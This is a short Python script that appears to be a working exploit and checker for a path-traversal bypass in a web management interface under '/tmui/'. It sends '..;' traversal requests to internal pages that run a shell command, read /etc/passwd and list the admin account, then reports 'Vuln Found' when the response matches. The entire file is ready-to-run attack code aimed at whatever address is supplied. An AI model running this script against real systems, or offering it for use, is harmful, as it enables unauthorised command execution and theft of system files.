import re
import requests
import sys
import os

def exploit(dst_addr):
       vuln_list =[["/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/xxx","uid=\d"],
                   ["/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",".*:x:\d"],
                   ["/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin", "auth user admin"]]            

       URL="http://"+dst_addr

       for i in range(3):
               print(URL+vuln_list[i][0])
               res = requests.get(URL+vuln_list[i][0],verify =False)
               print("Status Code : %d"% res.status_code)
               response = res.text
               p = re.compile(vuln_list[i][1])
               m = p.match(response)
               if m:
                   print("Vuln Found")
               else:
                   print("Not Found")
            
if __name__ == "__main__":
       if len(sys.argv) == 2:
              sys.argv.append('80')
       elif len(sys.argv) < 3:
               print ('Usage: python %s <dst_ip> <dst_port>' % os.path.basename(sys.argv[0]))
               sys.exit()

       address =(sys.argv[1], sys.argv[2])
       dst_addr=":".join(address)
       exploit(dst_addr)
